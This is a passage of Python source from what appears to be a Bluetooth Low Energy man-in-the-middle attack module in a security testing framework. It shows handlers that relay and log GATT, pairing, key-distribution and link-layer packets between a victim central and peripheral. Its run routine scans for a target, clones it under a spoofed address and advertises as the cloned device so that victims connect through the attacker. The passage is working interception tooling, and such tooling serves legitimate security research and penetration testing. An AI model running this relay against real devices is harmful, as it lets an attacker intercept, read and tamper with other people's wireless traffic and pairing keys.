    @module.scenarioSignal("onMasterReadByGroupTypeRequest")
    def readByGroupType(self, packet):
        io.info(
            "Read By Group Type Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
        )
        self.masterInDiscovery = True
        self.forwardToSlave(
            ble.BLEReadByGroupTypeRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
            )
        )

    @module.scenarioSignal("onSlaveReadByTypeResponse")
    def readByTypeResponse(self, packet):
        io.info("Read By Type Response (from slave) : data = " + packet.data.hex())
        self.forwardToMaster(ble.BLEReadByTypeResponse(data=packet.data))

    @module.scenarioSignal("onSlaveReadByGroupTypeResponse")
    def readByGroupTypeResponse(self, packet):
        io.info(
            "Read By Group Type Response (from slave) : length = "
            + str(packet.length)
            + " / data = "
            + packet.data.hex()
        )
        self.forwardToMaster(
            ble.BLEReadByGroupTypeResponse(length=packet.length, data=packet.data)
        )

    @module.scenarioSignal("onSlaveConnectionParameterUpdateRequest")
    def slaveConnectionParameterUpdateRequest(self, packet):
        io.info(
            "Connection Parameter Update Request (from slave) : slaveLatency = "
            + str(packet.slaveLatency)
            + " / timeoutMult = "
            + str(packet.timeoutMult)
            + " / minInterval = "
            + str(packet.minInterval)
            + " / maxInterval = "
            + str(packet.maxInterval)
        )

        self.maxInterval = packet.maxInterval
        self.minInterval = packet.minInterval
        self.timeoutMult = packet.timeoutMult
        self.slaveLatency = packet.slaveLatency
        self.minCe = 0
        self.maxCe = 0
        if self.getStage() != BLEMitmStage.ACTIVE_MITM:
            io.info("Sending a response to slave ...")
            self.a2sEmitter.sendp(
                ble.BLEConnectionParameterUpdateResponse(
                    l2capCmdId=packet.l2capCmdId, moveResult=0
                )
            )
            self.a2sEmitter.updateConnectionParameters(
                timeout=packet.timeoutMult,
                latency=packet.slaveLatency,
                minInterval=packet.minInterval,
                maxInterval=packet.maxInterval,
                minCe=0,
                maxCe=0,
            )
        else:
            io.info("Redirecting to master ...")
            self.a2mEmitter.sendp(
                ble.BLEConnectionParameterUpdateRequest(
                    l2capCmdId=packet.l2capCmdId,
                    timeoutMult=packet.timeoutMult,
                    slaveLatency=packet.slaveLatency,
                    minInterval=packet.minInterval,
                    maxInterval=packet.maxInterval,
                )
            )

    @module.scenarioSignal("onMasterConnectionParameterUpdateResponse")
    def masterConnectionParameterUpdateResponse(self, packet):
        io.info(
            "Connection Parameter Update Response (from master) : moveResult = "
            + str(packet.moveResult)
        )

        io.info("Redirecting to slave ...")
        self.a2sEmitter.sendp(
            ble.BLEConnectionParameterUpdateResponse(
                l2capCmdId=packet.l2capCmdId, moveResult=packet.moveResult
            )
        )
        if packet.moveResult == 0 and self.a2sEmitter.isConnected():
            io.info(
                "Updating Connection Parameter: slaveLatency = "
                + str(self.slaveLatency)
                + " / timeoutMult = "
                + str(self.timeoutMult)
                + " / minInterval = "
                + str(self.minInterval)
                + " / maxInterval = "
                + str(self.maxInterval)
            )
            self.a2sEmitter.updateConnectionParameters(
                timeout=self.timeoutMult,
                latency=self.slaveLatency,
                minInterval=self.minInterval,
                maxInterval=self.maxInterval,
            )

    # Link Layer Callbacks

    @module.scenarioSignal("onSlaveLLConnUpdateInd")
    def slaveLLConnUpdateInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLConnUpdateInd")
    def masterLLConnUpdateInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLChannelMapInd")
    def slaveLLChannelMapInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLChannelMapInd")
    def masterLLChannelMapInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLTerminateInd")
    def slaveLLTerminateInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLTerminateInd")
    def masterLLTerminateInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onMasterLLEncReq")
    def masterLLEncReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLEncReq")
    def slaveLLEncReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLEncRsp")
    def masterLLEncRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLEncRsp")
    def slaveLLEncRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLStartEncReq")
    def masterLLStartEncReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLStartEncReq")
    def slaveLLStartEncReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLStartEncRsp")
    def masterLLStartEncRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLStartEncRsp")
    def slaveLLStartEncRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onSlaveLLUnknownRsp")
    def slaveLLUnknownRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLUnknownRsp")
    def masterLLUnknownRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLFeatureReq")
    def slaveLLFeatureReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLFeatureReq")
    def masterLLFeatureReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLFeatureRsp")
    def slaveLLFeatureRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLFeatureRsp")
    def masterLLFeatureRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onMasterLLPauseEncReq")
    def masterLLPauseEncReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPauseEncReq")
    def slaveLLPauseEncReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPauseEncRsp")
    def masterLLPauseEncRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPauseEncRsp")
    def slaveLLPauseEncRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onSlaveLLVersionInd")
    def slaveLLVersionInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLVersionInd")
    def masterLLVersionInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLRejectInd")
    def slaveLLRejectInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLRejectInd")
    def masterLLRejectInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onMasterLLSlaveFeatureReq")
    def masterLLSlaveFeatureReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLSlaveFeatureReq")
    def slaveLLSlaveFeatureReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onSlaveLLConnParamReq")
    def slaveLLConnParamReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLConnParamReq")
    def masterLLConnParamReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLConnParamRsp")
    def slaveLLConnParamRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLConnParamRsp")
    def masterLLConnParamRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLRejectExtInd")
    def slaveLLRejectExtInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLRejectExtInd")
    def masterLLRejectExtInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPingReq")
    def slaveLLPingReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPingReq")
    def masterLLPingReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPingRsp")
    def slaveLLPingRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPingRsp")
    def masterLLPingRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLLengthReq")
    def slaveLLLengthReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLLengthReq")
    def masterLLLengthReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLLengthRsp")
    def slaveLLLengthRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLLengthRsp")
    def masterLLLengthRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPhyReq")
    def slaveLLPhyReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPhyReq")
    def masterLLPhyReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPhyRsp")
    def slaveLLPhyRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPhyRsp")
    def masterLLPhyRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPhyUpdateInd")
    def slaveLLPhyUpdateInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPhyUpdateInd")
    def masterLLPhyUpdateInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLMinUsedChannelsInd")
    def slaveLLMinUsedChannelsInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLMinUsedChannelsInd")
    def masterLLMinUsedChannelsInd(self, packet):
        io.info("Master: " + packet.toString())

    # TODO: Callbacks, which are by the time of writing not supported by Dongle
    # @module.scenarioSignal("onSlaveLLCTEReq")
    # def slaveLLCTEReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCTEReq")
    # def masterLLCTEReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCTERsp")
    # def slaveLLCTERsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCTERsp")
    # def masterLLCTERsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # # @module.scenarioSignal("onSlaveLLPeriodicSyncInd")
    # def slaveLLPeriodicSyncInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLPeriodicSyncInd")
    # def masterLLPeriodicSyncInd(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLClockAccuracyReq")
    # def slaveLLClockAccuracyReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLClockAccuracyReq")
    # def masterLLClockAccuracyReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLClockAccuracyRsp")
    # def slaveLLClockAccuracyRsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLClockAccuracyRsp")
    # def masterLLClockAccuracyRsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISReq")
    # def slaveLLCISReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISReq")
    # def masterLLCISReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISRsp")
    # def slaveLLCISRsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISRsp")
    # def masterLLCISRsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISInd")
    # def slaveLLCISInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISInd")
    # def masterLLCISInd(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISTerminateInd")
    # def slaveLLCISTerminateInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISTerminateInd")
    # def masterLLCISTerminateInd(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLPowerControlReq")
    # def slaveLLPowerControlReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLPowerControlReq")
    # def masterLLPowerControlReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLPowerControlRsp")
    # def slaveLLPowerControlRsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLPowerControlRsp")
    # def masterLLPowerControlRsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLChangeInd")
    # def slaveLLChangeInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLChangeInd")
    # def masterLLChangeInd(self, packet):
    #     io.info("Master: " + packet.toString())

    def registerEvents(self):

        # Connect Callbacks
        self.a2mReceiver.onEvent("BLEConnectResponse", callback=self.connect)

        # Disconnect Callbacks
        self.a2mReceiver.onEvent("BLEDisconnect", callback=self.disconnectMaster)
        self.a2sReceiver.onEvent("BLEDisconnect", callback=self.disconnectSlave)

        # Error Callback
        self.a2sReceiver.onEvent("BLEErrorResponse", callback=self.slaveErrorResponse)
        self.a2mReceiver.onEvent("BLEErrorResponse", callback=self.masterErrorResponse)

        # Write Callbacks
        self.a2mReceiver.onEvent("BLEWriteCommand", callback=self.writeCommand)
        self.a2mReceiver.onEvent("BLEWriteRequest", callback=self.writeRequest)
        self.a2sReceiver.onEvent("BLEWriteResponse", callback=self.writeResponse)

        # Read Callbacks
        self.a2mReceiver.onEvent("BLEReadRequest", callback=self.read)
        self.a2sReceiver.onEvent("BLEReadResponse", callback=self.readResponse)
        self.a2mReceiver.onEvent("BLEReadBlobRequest", callback=self.readBlob)
        self.a2sReceiver.onEvent("BLEReadBlobResponse", callback=self.readBlobResponse)

        # Notification Callback
        self.a2sReceiver.onEvent(
            "BLEHandleValueNotification", callback=self.notification
        )
        self.a2sReceiver.onEvent("BLEHandleValueIndication", callback=self.indication)
        self.a2mReceiver.onEvent(
            "BLEHandleValueConfirmation", callback=self.confirmation
        )

        # Find Information Callbacks
        self.a2mReceiver.onEvent(
            "BLEFindInformationRequest", callback=self.findInformation
        )
        self.a2sReceiver.onEvent(
            "BLEFindInformationResponse", callback=self.findInformationResponse
        )

        # Find Type Value Callbacks
        self.a2mReceiver.onEvent(
            "BLEFindByTypeValueRequest", callback=self.findByTypeValueRequest
        )
        self.a2sReceiver.onEvent(
            "BLEFindByTypeValueResponse", callback=self.findByTypeValueResponse
        )

        # Read By Callbacks
        self.a2mReceiver.onEvent("BLEReadByTypeRequest", callback=self.masterReadByType)
        self.a2sReceiver.onEvent("BLEReadByTypeRequest", callback=self.slaveReadByType)

        self.a2mReceiver.onEvent(
            "BLEReadByGroupTypeRequest", callback=self.readByGroupType
        )
        self.a2sReceiver.onEvent(
            "BLEReadByTypeResponse", callback=self.readByTypeResponse
        )
        self.a2sReceiver.onEvent(
            "BLEReadByGroupTypeResponse", callback=self.readByGroupTypeResponse
        )

        # MTU Callbacks
        self.a2mReceiver.onEvent(
            "BLEExchangeMTURequest", callback=self.exchangeMtuRequest
        )
        self.a2sReceiver.onEvent(
            "BLEExchangeMTUResponse", callback=self.exchangeMtuResponse
        )

        # Connection Parameter Update Callbacks
        self.a2mReceiver.onEvent(
            "BLEConnectionParameterUpdateResponse",
            callback=self.masterConnectionParameterUpdateResponse,
        )

        self.a2sReceiver.onEvent(
            "BLEConnectionParameterUpdateRequest",
            callback=self.slaveConnectionParameterUpdateRequest,
        )

        # Security Manager Callbacks
        self.a2mReceiver.onEvent(
            "BLELongTermKeyRequest", callback=self.longTermKeyRequest
        )

        self.a2mReceiver.onEvent(
            "BLEEncryptionChange", callback=self.masterEncryptionChange
        )
        self.a2sReceiver.onEvent(
            "BLEEncryptionChange", callback=self.slaveEncryptionChange
        )

        self.a2mReceiver.onEvent("BLEPairingRequest", callback=self.pairingRequest)
        self.a2sReceiver.onEvent("BLEPairingResponse", callback=self.pairingResponse)
        self.a2sReceiver.onEvent("BLESecurityRequest", callback=self.securityRequest)

        self.a2sReceiver.onEvent("BLEPairingConfirm", callback=self.slavePairingConfirm)
        self.a2mReceiver.onEvent("BLEPairingConfirm", callback=self.masterConfirmValue)
        self.a2mReceiver.onEvent("BLEPairingRandom", callback=self.masterPairingRandom)
        self.a2sReceiver.onEvent("BLEPairingRandom", callback=self.slavePairingRandom)
        self.a2sReceiver.onEvent("BLEPairingFailed", callback=self.slavePairingFailed)
        self.a2mReceiver.onEvent("BLEPairingFailed", callback=self.masterPairingFailed)

        self.a2sReceiver.onEvent(
            "BLEEncryptionInformation", callback=self.slaveEncryptionInformation
        )        
        self.a2sReceiver.onEvent(
            "BLEMasterIdentification", callback=self.slaveMasterIdentification
        )
        self.a2sReceiver.onEvent(
            "BLEIdentityInformation", callback=self.slaveIdentityInformation
        )
        self.a2sReceiver.onEvent(
            "BLEIdentityAddressInformation",
            callback=self.slaveIdentityAddressInformation,
        )
        self.a2sReceiver.onEvent(
            "BLESigningInformation", callback=self.slaveSigningInformation
        )

        self.a2mReceiver.onEvent(
            "BLEEncryptionInformation", callback=self.masterEncryptionInformation
        )        
        self.a2mReceiver.onEvent(
            "BLEMasterIdentification", callback=self.masterMasterIdentification
        )
        self.a2mReceiver.onEvent(
            "BLEIdentityInformation", callback=self.masterIdentityInformation
        )
        self.a2mReceiver.onEvent(
            "BLEIdentityAddressInformation",
            callback=self.masterIdentityAddressInformation,
        )
        self.a2mReceiver.onEvent(
            "BLESigningInformation", callback=self.masterSigningInformation
        )

        self.a2sReceiver.onEvent("BLEPublicKey", callback=self.slavePublicKey)
        self.a2mReceiver.onEvent("BLEPublicKey", callback=self.masterPublicKey)

        self.a2sReceiver.onEvent("BLEDHKeyCheck", callback=self.slaveDHKeyCheck)
        self.a2mReceiver.onEvent("BLEDHKeyCheck", callback=self.masterDHKeyCheck)

    def registerLLEvents(self):

        # LL Callbacks
        self.a2sReceiver.onEvent(
            "BLELLConnUpdateInd", callback=self.slaveLLConnUpdateInd
        )
        self.a2mReceiver.onEvent(
            "BLELLConnUpdateInd", callback=self.masterLLConnUpdateInd
        )
        self.a2sReceiver.onEvent("BLELLChanMapInd", callback=self.slaveLLChannelMapInd)
        self.a2mReceiver.onEvent("BLELLChanMapInd", callback=self.masterLLChannelMapInd)
        self.a2sReceiver.onEvent("BLELLTerminateInd", callback=self.slaveLLTerminateInd)
        self.a2mReceiver.onEvent(
            "BLELLTerminateInd", callback=self.masterLLTerminateInd
        )

        self.a2mReceiver.onEvent("BLELLEncReq", callback=self.masterLLEncReq)
        self.a2sReceiver.onEvent("BLELLEncReq", callback=self.slaveLLEncReq)

        self.a2sReceiver.onEvent("BLELLEncRsp", callback=self.slaveLLEncRsp)
        self.a2mReceiver.onEvent("BLELLEncRsp", callback=self.masterLLEncRsp)

        self.a2sReceiver.onEvent("BLELLStartEncReq", callback=self.slaveLLStartEncReq)
        self.a2mReceiver.onEvent("BLELLStartEncReq", callback=self.masterLLStartEncReq)

        self.a2sReceiver.onEvent("BLELLStartEncRsp", callback=self.slaveLLStartEncRsp)
        self.a2mReceiver.onEvent("BLELLStartEncRsp", callback=self.masterLLStartEncRsp)

        self.a2sReceiver.onEvent("BLELLUnknownRsp", callback=self.slaveLLUnknownRsp)
        self.a2mReceiver.onEvent("BLELLUnknownRsp", callback=self.masterLLUnknownRsp)

        self.a2sReceiver.onEvent("BLELLFeatureReq", callback=self.slaveLLFeatureReq)
        self.a2mReceiver.onEvent("BLELLFeatureReq", callback=self.masterLLFeatureReq)

        self.a2sReceiver.onEvent("BLELLFeatureRsp", callback=self.slaveLLFeatureRsp)
        self.a2mReceiver.onEvent("BLELLFeatureRsp", callback=self.masterLLFeatureRsp)

        self.a2mReceiver.onEvent("BLELLPauseEncReq", callback=self.masterLLPauseEncReq)
        self.a2sReceiver.onEvent("BLELLPauseEncReq", callback=self.slaveLLPauseEncReq)

        self.a2sReceiver.onEvent("BLELLPauseEncRsp", callback=self.slaveLLPauseEncRsp)
        self.a2mReceiver.onEvent("BLELLPauseEncRsp", callback=self.masterLLPauseEncRsp)

        self.a2sReceiver.onEvent("BLELLVersionInd", callback=self.slaveLLVersionInd)
        self.a2mReceiver.onEvent("BLELLVersionInd", callback=self.masterLLVersionInd)

        self.a2sReceiver.onEvent("BLELLRejectInd", callback=self.slaveLLRejectInd)
        self.a2mReceiver.onEvent("BLELLRejectInd", callback=self.masterLLRejectInd)

        self.a2sReceiver.onEvent(
            "BLELLSlaveFeatureReq", callback=self.slaveLLSlaveFeatureReq
        )
        self.a2mReceiver.onEvent(
            "BLELLSlaveFeatureReq", callback=self.masterLLSlaveFeatureReq
        )

        self.a2sReceiver.onEvent("BLELLConnParamReq", callback=self.slaveLLConnParamReq)
        self.a2mReceiver.onEvent(
            "BLELLConnParamReq", callback=self.masterLLConnParamReq
        )
        self.a2sReceiver.onEvent("BLELLConnParamRsp", callback=self.slaveLLConnParamRsp)
        self.a2mReceiver.onEvent(
            "BLELLConnParamRsp", callback=self.masterLLConnParamRsp
        )

        self.a2sReceiver.onEvent("BLELLRejectExtInd", callback=self.slaveLLRejectExtInd)
        self.a2mReceiver.onEvent(
            "BLELLRejectExtInd", callback=self.masterLLRejectExtInd
        )

        self.a2sReceiver.onEvent("BLELLPingReq", callback=self.slaveLLPingReq)
        self.a2mReceiver.onEvent("BLELLPingReq", callback=self.masterLLPingReq)

        self.a2sReceiver.onEvent("BLELLPingRsp", callback=self.slaveLLPingRsp)
        self.a2mReceiver.onEvent("BLELLPingRsp", callback=self.masterLLPingRsp)

        self.a2sReceiver.onEvent("BLELLDataLenReq", callback=self.slaveLLLengthReq)
        self.a2mReceiver.onEvent("BLELLDataLenReq", callback=self.masterLLLengthReq)

        self.a2sReceiver.onEvent("BLELLDataLenRsp", callback=self.slaveLLLengthRsp)
        self.a2mReceiver.onEvent("BLELLDataLenRsp", callback=self.masterLLLengthRsp)

        self.a2sReceiver.onEvent("BLELLPhyReq", callback=self.slaveLLPhyReq)
        self.a2mReceiver.onEvent("BLELLPhyReq", callback=self.masterLLPhyReq)

        self.a2sReceiver.onEvent("BLELLPhyRsp", callback=self.slaveLLPhyRsp)
        self.a2mReceiver.onEvent("BLELLPhyRsp", callback=self.masterLLPhyRsp)

        self.a2sReceiver.onEvent("BLELLUpdPHYInd", callback=self.slaveLLPhyUpdateInd)
        self.a2mReceiver.onEvent("BLELLUpdPHYInd", callback=self.masterLLPhyUpdateInd)

        self.a2sReceiver.onEvent(
            "BLELLMinUsedChann", callback=self.slaveLLMinUsedChannelsInd
        )
        self.a2mReceiver.onEvent(
            "BLELLMinUsedChann", callback=self.masterLLMinUsedChannelsInd
        )

        # TODO: Callbacks, which are by the time of writing not supported by Dongle
        # self.a2sReceiver.onEvent("BLELLCTEReq", callback=self.slaveLLCTEReq)
        # self.a2mReceiver.onEvent("BLELLCTEReq", callback=self.masterLLCTEReq)

        # self.a2sReceiver.onEvent("BLELLCTERsp", callback=self.slaveLLCTERsp)
        # self.a2mReceiver.onEvent("BLELLCTERsp", callback=self.masterLLCTERsp)

        # self.a2sReceiver.onEvent("BLELLPeriodicSyncInd", callback=self.slaveLLPeriodicSyncInd)
        # self.a2mReceiver.onEvent("BLELLPeriodicSyncInd", callback=self.masterLLPeriodicSyncInd)

        # self.a2sReceiver.onEvent("BLELLClockAccuracyReq", callback=self.slaveLLClockAccuracyReq)
        # self.a2mReceiver.onEvent("BLELLClockAccuracyReq", callback=self.masterLLClockAccuracyReq)

        # self.a2sReceiver.onEvent("BLELLClockAccuracyRsp", callback=self.slaveLLClockAccuracyRsp)
        # self.a2mReceiver.onEvent("BLELLClockAccuracyRsp", callback=self.masterLLClockAccuracyRsp)

        # self.a2sReceiver.onEvent("BLELLCISReq", callback=self.slaveLLCISReq)
        # self.a2mReceiver.onEvent("BLELLCISReq", callback=self.masterLLCISReq)

        # self.a2sReceiver.onEvent("BLELLCISRsp", callback=self.slaveLLCISRsp)
        # self.a2mReceiver.onEvent("BLELLCISRsp", callback=self.masterLLCISRsp)

        # self.a2sReceiver.onEvent("BLELLCISInd", callback=self.slaveLLCISInd)
        # self.a2mReceiver.onEvent("BLELLCISInd", callback=self.masterLLCISInd)

        # self.a2sReceiver.onEvent("BLELLCISTerminateInd", callback=self.slaveLLCISTerminateInd)
        # self.a2mReceiver.onEvent("BLELLCISTerminateInd", callback=self.masterLLCISTerminateInd)

        # self.a2sReceiver.onEvent("BLELLPowerControlReq", callback=self.slaveLLPowerControlReq)
        # self.a2mReceiver.onEvent("BLELLPowerControlReq", callback=self.masterLLPowerControlReq)

        # self.a2sReceiver.onEvent("BLELLPowerControlRsp", callback=self.slaveLLPowerControlRsp)
        # self.a2mReceiver.onEvent("BLELLPowerControlRsp", callback=self.masterLLPowerControlRsp)

        # self.a2sReceiver.onEvent("BLELLChangeInd", callback=self.slaveLLChangeInd)
        # self.a2mReceiver.onEvent("BLELLChangeInd", callback=self.masterLLChangeInd)

    def checkParametersValidity(self):
        if self.args["ADVERTISING_STRATEGY"] not in ("preconnect", "flood"):
            io.fail("You have to select a valid strategy : 'flood' or 'preconnect'")
            return self.nok()
        return None

    def run(self):
        validity = self.checkParametersValidity()
        if validity is not None:
            return validity

        
        self.setPairingMethods()
        self.initEmittersAndReceivers()

        self.a2mReceiver.storeCallbacks()
        self.a2sReceiver.storeCallbacks()

        if self.checkCapabilities():
            if self.loadScenario():
                io.info("Scenario loaded !")
                self.startScenario()
            
            self.a2sEmitter.setAddress(CryptoUtils.getRandomAddress(), random=True)

            self.slaveLocalAddress = self.a2sEmitter.getAddress()
            self.slaveLocalAddressType = (
                0 if self.a2sEmitter.getAddressMode() == "public" else 1
            )

            self.a2mEmitter.setAddress(CryptoUtils.getRandomAddress(), random=True)

            self.masterLocalAddress = self.a2mEmitter.getAddress()
            self.masterLocalAddressType = (
                0 if self.a2mEmitter.getAddressMode() == "public" else 1
            )
            # Advertising Callbacks
            self.a2sReceiver.onEvent("BLEAdvertisement", callback=self.scanStage)

            io.success("Entering SCAN stage ...")
            self.setStage(BLEMitmStage.SCAN)

            self.a2sReceiver.setScan(enable=True)

            self.waitUntilStage(BLEMitmStage.CLONE)

            self.a2sReceiver.setScan(enable=False)

            self.a2sReceiver.removeCallbacks()

            self.registerLLEvents()
            self.registerEvents()

            if self.args["ADVERTISING_STRATEGY"] == "preconnect":
                self.connectOnSlave()

            self.a2mEmitter.setAdvertising(enable=True)
            io.success("Started Advertising. Entering WAIT_CONNECTION stage ...")
            self.setStage(BLEMitmStage.WAIT_CONNECTION)

            self.waitUntilStage(BLEMitmStage.STOP)

            self.a2mReceiver.restoreCallbacks()
            self.a2sReceiver.restoreCallbacks()
            # Clean up connections
            if self.a2mEmitter.isConnected():
                self.a2mEmitter.sendp(ble.BLEDisconnect())
            while self.a2mEmitter.isConnected():
                utils.wait(seconds=0.01)
            if self.a2sEmitter.isConnected():
                self.a2sEmitter.sendp(ble.BLEDisconnect())
            while self.a2sEmitter.isConnected():
                utils.wait(seconds=0.01)

            moduleResult = {}
            if self.scenarioEnabled:
                scenarioResult = self.endScenario({})
                moduleResult["scenarioResult"] = scenarioResult
            io.success("Result: {}".format(moduleResult))
            # Reset public address
            self.a2mEmitter.setAddress("00:00:00:00:00", random=False)
            self.a2sEmitter.setAddress("00:00:00:00:00", random=False)
            return self.ok(moduleResult)
        else:
            io.fail(
                "Interfaces provided ("
                + str(self.args["INTERFACE"])
                + ") are not able to run this module."
            )
            return self.nok()
